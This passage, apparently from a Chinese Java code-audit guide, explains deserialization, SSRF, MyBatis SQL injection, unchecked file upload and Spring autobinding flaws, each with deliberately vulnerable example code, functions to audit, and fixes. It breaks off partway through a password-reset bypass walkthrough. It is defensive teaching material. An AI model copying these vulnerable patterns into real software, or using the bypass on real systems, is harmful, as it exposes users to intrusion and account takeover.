<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x7A0B;&#x5E8F;&#x8BFB;&#x53D6;&#x8F93;&#x5165;&#x6D41;&#x5E76;&#x5C06;&#x5176;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E3A;&#x5BF9;&#x8C61;&#x3002;&#x6B64;&#x65F6;&#x53EF;&#x67E5;&#x770B;&#x9879;&#x76EE;&#x5DE5;&#x7A0B;&#x4E2D;&#x662F;&#x5426;&#x5F15;&#x5165;&#x53EF;&#x5229;&#x7528;&#x7684;commons-collections 3.1&#x3001;commons-fileupload 1.3.1&#x7B49;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;&#xFF0C;&#x5373;&#x53EF;&#x6784;&#x9020;&#x7279;&#x5B9A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;&#x76F8;&#x5173;&#x4E09;&#x65B9;&#x5E93;&#x53CA;&#x5229;&#x7528;&#x5DE5;&#x5177;&#x53EF;&#x53C2;&#x8003;ysoserial&#x3001;marshalsec&#x3002;</p>
<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-1"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-1" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x4E00;&#x822C;&#x5728;&#x5BFC;&#x5165;&#x6A21;&#x7248;&#x6587;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x901A;&#x4FE1;&#x3001;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x3001;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#x5316;&#x5B58;&#x50A8;&#x3001;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#x843D;&#x78C1;&#x76D8;&#x6216;DB&#x5B58;&#x50A8;&#x7B49;&#x4E1A;&#x52A1;&#x573A;&#x666F;,&#x5728;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x65F6;&#x53EF;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x4E00;&#x4E9B;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x5E76;&#x5224;&#x65AD;&#x8F93;&#x5165;&#x662F;&#x5426;&#x53EF;&#x63A7;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`ObjectInputStream.readObject`</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-1"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-1" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><p>&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x660E;&#x786E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x7C7B;&#x7684;&#x5219;&#x53EF;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x8BBE;&#x7F6E;&#x767D;&#x540D;&#x5355;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x53EA;&#x63D0;&#x4F9B;&#x63A5;&#x53E3;&#x7684;&#x5E93;&#x5219;&#x53EF;&#x4F7F;&#x7528;&#x9ED1;&#x540D;&#x5355;&#x8BBE;&#x7F6E;&#x4E0D;&#x5141;&#x8BB8;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7C7B;&#x6216;&#x8005;&#x63D0;&#x4F9B;&#x8BBE;&#x7F6E;&#x767D;&#x540D;&#x5355;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;Hook&#x51FD;&#x6570;resolveClass&#x6765;&#x6821;&#x9A8C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x767D;&#x540D;&#x5355;&#x6821;&#x9A8C;&#xFF0C;&#x793A;&#x4F8B;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class AntObjectInputStream extends ObjectInputStream{</span><br><span class="line">    public AntObjectInputStream(InputStream inputStream)</span><br><span class="line">            throws IOException {</span><br><span class="line">        super(inputStream);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * &#x53EA;&#x5141;&#x8BB8;&#x53CD;&#x5E8F;&#x5217;&#x5316;SerialObject class</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,</span><br><span class="line">            ClassNotFoundException {</span><br><span class="line">        if (!desc.getName().equals(SerialObject.class.getName())) {</span><br><span class="line">            throw new InvalidClassException(</span><br><span class="line">                    &quot;Unauthorized deserialization attempt&quot;,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        }</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Apache Commons IO Serialization&#x5305;&#x4E2D;&#x7684;ValidatingObjectInputStream&#x7C7B;&#x7684;accept&#x65B9;&#x6CD5;&#x6765;&#x5B9E;&#x73B0;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7C7B;&#x767D;/&#x9ED1;&#x540D;&#x5355;&#x63A7;&#x5236;&#xFF0C;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;&#x5219;&#x5347;&#x7EA7;&#x5230;&#x6700;&#x65B0;&#x7248;&#x672C;&#x3002;&#x66F4;&#x591A;&#x4FEE;&#x590D;&#x65B9;&#x6848;&#x53EF;&#x53C2;&#x8003;<a href="/external_links/25094c95b605ea77d68d34f95d5d6c5f.html" target="blank" rel="noopener">&#x6D45;&#x8C08;Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x65B9;&#x6848;</a>&#x3002;</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h5 id="&#x4ECB;&#x7ECD;-2"><a href="#&#x4ECB;&#x7ECD;-2" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>SSRF&#x5F62;&#x6210;&#x7684;&#x539F;&#x56E0;&#x5927;&#x90FD;&#x662F;&#x7531;&#x4E8E;&#x4EE3;&#x7801;&#x4E2D;&#x63D0;&#x4F9B;&#x4E86;&#x4ECE;&#x5176;&#x4ED6;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x7528;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#x4F46;&#x6CA1;&#x6709;&#x5BF9;&#x76EE;&#x6807;&#x5730;&#x5740;&#x505A;&#x8FC7;&#x6EE4;&#x4E0E;&#x9650;&#x5236;&#x3002;&#x6BD4;&#x5982;&#x4ECE;&#x6307;&#x5B9A;URL&#x94FE;&#x63A5;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x3001;&#x4E0B;&#x8F7D;&#x7B49;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-2"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-2" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6B64;&#x5904;&#x4EE5;HttpURLConnection&#x4E3A;&#x4F8B;&#xFF0C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x7247;&#x6BB5;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;	String url = request.getParameter(&quot;picurl&quot;);</span><br><span class="line">	StringBuffer response = new StringBuffer();</span><br><span class="line"></span><br><span class="line">   	URL pic = new URL(url);</span><br><span class="line">   	HttpURLConnection con = (HttpURLConnection) pic.openConnection();</span><br><span class="line">	con.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">	con.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0&quot;);</span><br><span class="line">	BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));</span><br><span class="line">	String inputLine;</span><br><span class="line">	while ((inputLine = in.readLine()) != null) {</span><br><span class="line">	     response.append(inputLine);</span><br><span class="line">   	}</span><br><span class="line">	in.close();</span><br><span class="line">	modelMap.put(&quot;resp&quot;,response.toString());</span><br><span class="line">	return &quot;getimg.htm&quot;;</span><br></pre></td></tr></table></figure>

<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-2"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-2" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>&#x7A0B;&#x5E8F;&#x4E2D;&#x53D1;&#x8D77;HTTP&#x8BF7;&#x6C42;&#x64CD;&#x4F5C;&#x4E00;&#x822C;&#x5728;&#x83B7;&#x53D6;&#x8FDC;&#x7A0B;&#x56FE;&#x7247;&#x3001;&#x9875;&#x9762;&#x5206;&#x4EAB;&#x6536;&#x85CF;&#x7B49;&#x4E1A;&#x52A1;&#x573A;&#x666F;,&#x5728;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x65F6;&#x53EF;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x4E00;&#x4E9B;HTTP&#x8BF7;&#x6C42;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`HttpClient.execute`</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-2"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-2" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>&#x4F7F;&#x7528;&#x767D;&#x540D;&#x5355;&#x6821;&#x9A8C;HTTP&#x8BF7;&#x6C42;url&#x5730;&#x5740;</li>
<li>&#x907F;&#x514D;&#x5C06;&#x8BF7;&#x6C42;&#x54CD;&#x5E94;&#x53CA;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;</li>
<li>&#x7981;&#x7528;&#x4E0D;&#x9700;&#x8981;&#x7684;&#x534F;&#x8BAE;&#x53CA;&#x9650;&#x5236;&#x8BF7;&#x6C42;&#x7AEF;&#x53E3;,&#x4EC5;&#x4EC5;&#x5141;&#x8BB8;http&#x548C;https&#x8BF7;&#x6C42;&#x7B49;</li>
</ul>
<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><h5 id="&#x4ECB;&#x7ECD;-3"><a href="#&#x4ECB;&#x7ECD;-3" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x7684;&#x672C;&#x8D28;&#xFF0C;&#x662F;&#x7A0B;&#x5E8F;&#x628A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x5F53;&#x505A;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x6761;&#x4EF6;&#xFF0C;&#x7B2C;&#x4E00;&#x662F;&#x7528;&#x6237;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x8F93;&#x5165;&#xFF1B;&#x7B2C;&#x4E8C;&#x662F;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x88AB;&#x62FC;&#x63A5;&#x5230;&#x8981;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x4E2D;&#x4ECE;&#x800C;&#x88AB;&#x6267;&#x884C;&#x3002;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x5219;&#x662F;&#x7A0B;&#x5E8F;&#x5C06;&#x7528;&#x6237;&#x8F93;&#x5165;&#x6570;&#x636E;&#x62FC;&#x63A5;&#x5230;&#x4E86;sql&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x653B;&#x51FB;&#x8005;&#x5373;&#x53EF;&#x6784;&#x9020;&#x3001;&#x6539;&#x53D8;sql&#x8BED;&#x4E49;&#x4ECE;&#x800C;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-3"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-3" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6B64;&#x5904;&#x4EE5;Mybatis&#x6846;&#x67B6;&#x4E3A;&#x4F8B;&#xFF0C;&#x793A;&#x4F8B;sql&#x7247;&#x6BB5;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;select * from books where id= ${id}</span><br></pre></td></tr></table></figure>

<p>&#x5BF9;&#x4E8E;Mybatis&#x6846;&#x67B6;&#x4E0B;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x7684;&#x5BA1;&#x8BA1;&#x53EF;&#x53C2;&#x8003;<a href="/external_links/8c21a2420aa4862a23a9fd8667bf7e50.html" target="blank" rel="noopener">Mybatis&#x6846;&#x67B6;&#x4E0B;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x9762;&#x9762;&#x89C2;</a></p>
<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-3"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-3" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><p>Mybatis&#x6846;&#x67B6;SQL&#x8BED;&#x53E5;&#x5B89;&#x5168;&#x5199;&#x6CD5;&#x5E94;&#x4F7F;&#x7528;#{},&#x907F;&#x514D;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x62FC;&#x63A5;&#x5F62;&#x5F0F;${}&#xFF0C;ibatis&#x5219;&#x4F7F;&#x7528;#&#x53D8;&#x91CF;#&#x3002;&#x5B89;&#x5168;&#x5199;&#x6CD5;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`select * from books where id= #{id}`</span><br></pre></td></tr></table></figure>

<h3 id="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;"><a href="#&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;"></a>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;</h3><h5 id="&#x4ECB;&#x7ECD;-4"><a href="#&#x4ECB;&#x7ECD;-4" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x901A;&#x5E38;&#x56E0;&#x4E3A;&#x672A;&#x6821;&#x9A8C;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x540E;&#x7F00;&#x7C7B;&#x578B;&#xFF0C;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x53EF;&#x4E0A;&#x4F20;jsp&#x7B49;&#x4E00;&#x4E9B;webshell&#x6587;&#x4EF6;&#x3002;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x65F6;&#x53EF;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x5BF9;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;&#x5426;&#x6709;&#x8DB3;&#x591F;&#x5B89;&#x5168;&#x7684;&#x6821;&#x9A8C;&#xFF0C;&#x4EE5;&#x53CA;&#x662F;&#x5426;&#x9650;&#x5236;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x7B49;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-4"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-4" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6B64;&#x5904;&#x4EE5;MultipartFile&#x4E3A;&#x4F8B;&#xFF0C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x7247;&#x6BB5;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;	public String handleFileUpload(MultipartFile file){</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        if (fileName==null) {</span><br><span class="line">            return &quot;file is error&quot;;</span><br><span class="line">        }</span><br><span class="line">        String filePath = &quot;/static/images/uploads/&quot;+fileName;</span><br><span class="line">        if (!file.isEmpty()) {</span><br><span class="line">            try {</span><br><span class="line">                byte[] bytes = file.getBytes();</span><br><span class="line">                BufferedOutputStream stream =</span><br><span class="line">                        new BufferedOutputStream(new FileOutputStream(new File(filePath)));</span><br><span class="line">                stream.write(bytes);</span><br><span class="line">                stream.close();</span><br><span class="line">                return &quot;OK&quot;;</span><br><span class="line">            } catch (Exception e) {</span><br><span class="line">                return e.getMessage();</span><br><span class="line">            }</span><br><span class="line">        } else {</span><br><span class="line">            return &quot;You failed to upload &quot; + file.getOriginalFilename() + &quot; because the file was empty.&quot;;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>

<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-3"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-3" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>java&#x7A0B;&#x5E8F;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`MultipartFile`</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-4"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-4" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>&#x4F7F;&#x7528;&#x767D;&#x540D;&#x5355;&#x6821;&#x9A8C;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x3001;&#x5927;&#x5C0F;&#x9650;&#x5236;</li>
</ul>
<h3 id="Autobinding"><a href="#Autobinding" class="headerlink" title="Autobinding"></a>Autobinding</h3><h5 id="&#x4ECB;&#x7ECD;-5"><a href="#&#x4ECB;&#x7ECD;-5" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>Autobinding-&#x81EA;&#x52A8;&#x7ED1;&#x5B9A;&#x6F0F;&#x6D1E;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x8BED;&#x8A00;/&#x6846;&#x67B6;&#xFF0C;&#x8BE5;&#x6F0F;&#x6D1E;&#x6709;&#x51E0;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x53EB;&#x6CD5;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<ul>
<li>Mass Assignment: Ruby on Rails, NodeJS</li>
<li>Autobinding: Spring MVC, ASP.NET MVC</li>
<li>Object injection: PHP(&#x5BF9;&#x8C61;&#x6CE8;&#x5165;&#x3001;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;)</li>
</ul>
<p>&#x8F6F;&#x4EF6;&#x6846;&#x67B6;&#x6709;&#x65F6;&#x5141;&#x8BB8;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x81EA;&#x52A8;&#x5C06;HTTP&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x7ED1;&#x5B9A;&#x5230;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x53D8;&#x91CF;&#x6216;&#x5BF9;&#x8C61;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x66F4;&#x5BB9;&#x6613;&#x5730;&#x4F7F;&#x7528;&#x8BE5;&#x6846;&#x67B6;&#x3002;&#x8FD9;&#x91CC;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x901A;&#x8FC7;&#x6784;&#x9020;http&#x8BF7;&#x6C42;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x7ED1;&#x5B9A;&#x5230;&#x5BF9;&#x8C61;&#x4E0A;&#xFF0C;&#x5F53;&#x4EE3;&#x7801;&#x903B;&#x8F91;&#x4F7F;&#x7528;&#x8BE5;&#x5BF9;&#x8C61;&#x53C2;&#x6570;&#x65F6;&#x5C31;&#x53EF;&#x80FD;&#x4EA7;&#x751F;&#x4E00;&#x4E9B;&#x4E0D;&#x53EF;&#x9884;&#x6599;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-5"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-5" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x4EE5;<a href="/external_links/3eee4fb06c2eed908398197b0a502eb0.html" target="blank" rel="noopener">ZeroNights-HackQuest-2016</a>&#x7684;demo&#x4E3A;&#x4F8B;&#xFF0C;&#x628A;&#x793A;&#x4F8B;&#x4E2D;&#x7684;justiceleague&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x8D77;&#x6765;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x5E94;&#x7528;&#x83DC;&#x5355;&#x680F;&#x6709;about&#xFF0C;reg&#xFF0C;Sign up&#xFF0C;Forgot password&#x8FD9;4&#x4E2A;&#x9875;&#x9762;&#x7EC4;&#x6210;&#x3002;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#x662F;&#x5BC6;&#x7801;&#x627E;&#x56DE;&#x529F;&#x80FD;&#xFF0C;&#x5373;&#x600E;&#x4E48;&#x6837;&#x7ED5;&#x8FC7;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x9A8C;&#x8BC1;&#x5E76;&#x627E;&#x56DE;&#x5BC6;&#x7801;&#x3002;</p>
<p>1&#xFF09;&#x9996;&#x5148;&#x770B;reset&#x65B9;&#x6CD5;&#xFF0C;&#x628A;&#x4E0D;&#x5F71;&#x54CD;&#x4EE3;&#x7801;&#x903B;&#x8F91;&#x7684;&#x5220;&#x6389;&#x3002;&#x8FD9;&#x6837;&#x66F4;&#x7B80;&#x6D01;&#x6613;&#x61C2;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`@Controller`</span><br><span class="line">@SessionAttributes(&quot;user&quot;)</span><br><span class="line">public class ResetPasswordController {</span><br><span class="line"></span><br><span class="line">private UserService userService;</span><br><span class="line">...</span><br><span class="line">@RequestMapping(value = &quot;/reset&quot;, method = RequestMethod.POST)</span><br><span class="line">public String resetHandler(@RequestParam String username, Model model) {</span><br><span class="line">		User user = userService.findByName(username);</span><br><span class="line">		if (user == null) {</span><br><span class="line">			return &quot;reset&quot;;</span><br><span class="line">		}</span><br><span class="line">		model.addAttribute(&quot;user&quot;, user);</span><br><span class="line">		return &quot;redirect: resetQuestion&quot;;</span><br><span class="line">	}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x91CC;&#x4ECE;&#x53C2;&#x6570;&#x83B7;&#x53D6;username&#x5E76;&#x68C0;&#x67E5;&#x6709;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x7528;&#x6237;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5219;&#x628A;&#x8FD9;&#x4E2A;user&#x5BF9;&#x8C61;&#x653E;&#x5230;Model&#x4E2D;&#x3002;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;Controller&#x4F7F;&#x7528;&#x4E86;@SessionAttributes(&#x201C;user&#x201D;)&#xFF0C;&#x6240;&#x4EE5;&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x628A;user&#x5BF9;&#x8C61;&#x653E;&#x5230;session&#x4E2D;&#x3002;&#x7136;&#x540E;&#x8DF3;&#x8F6C;&#x5230;resetQuestion&#x5BC6;&#x7801;&#x627E;&#x56DE;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x6821;&#x9A8C;&#x9875;&#x9762;&#x3002;</p>
<p>2&#xFF09;resetQuestion&#x5BC6;&#x7801;&#x627E;&#x56DE;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x6821;&#x9A8C;&#x9875;&#x9762;&#x6709;resetViewQuestionHandler&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x5C55;&#x73B0;</p>
